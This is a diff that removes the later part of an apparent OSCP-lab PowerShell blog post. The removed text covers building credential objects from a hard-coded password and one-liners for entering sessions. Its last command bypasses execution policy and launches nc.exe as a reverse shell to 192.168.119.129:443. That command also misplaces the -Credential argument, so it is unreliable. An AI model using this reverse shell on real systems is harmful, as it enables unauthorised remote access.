@@ -41,36 +41,3 @@ $credential = New-Object System.Management.Automation.PSCredential ($username, $
 $credential.GetNetworkCredential() | Format-List *
 {% endhighlight %}
 
-And as output, we should see the proper credentials returned in a PowerShell formatted list:
-
-{% highlight bash linenos %}
-UserName       : Chris
-Password       : 36mEAhz/B8xQ~2VM
-SecurePassword : System.Security.SecureString
-{% endhighlight %}
-
-Finally, I then entered into a new PowerShell session. This is completed by first using the New-PSSession cmdlet. This cmdlet allows us to create a new session on a local or remote computer. I then passed the stored secure credentials to this new session! And once passed, I piped to PowerShell's Enter-PSSession cmdlet to enter into the session:
-
-{% highlight bash linenos %}
-$username='Chris'
-$password='36mEAhz/B8xQ~2VM'
-$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
-$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)
-$credential.GetNetworkCredential() | Format-List *
-New-PSSession -Credential $credential | Enter-PSSession
-{% endhighlight %}
-
-And with that, I had properly created a simple script to switch into a user PowerShell session, when I was unable to log into the machine using external tools! 
-
-Now, to take this one step further. I could use this method and create a PowerShell one-liner. This one liner would look something like this (I have removed the `$credential.GetNetworkCredential() | Format-List *` line to make the line more digestable, but can be placed in for a credential check:
-
-{% highlight bash linenos %}
-$username='Chris';$password='36mEAhz/B8xQ~2VM';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword);New-PSSession -Credential $credential | Enter-PSSession
-{% endhighlight %}
-
-And this would enter into a new PowerShell session as a one-liner. To use this one-liner in another practical example, during OSCP's labs I had to bypass a restricted PowerShell policy and spawn a new process with user credentials, in a one-liner. To start, check out my previous post on <a href="https://ubg-hacking.team/2020/05/23/powershell-for-pentesters-beating-restricted-policies.html" target="_blank">beating PowerShell's restricted policies</a>. To spawn our new process, we would make the following change:
-
-{% highlight bash linenos %}
-powershell -exec bypass -nop -c "& {$username='Chris';$password='36mEAhz/B8xQ~2VM';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword);$prog='C:\\temp\\nc.exe'; $args='-e cmd.exe 192.168.119.129 443'; Start-Process -Credential $prog $args }"
-
-It is important to pass the `-Credential` object first, before `$prog` and the `$args` variables to work properly. Thanks for reading!
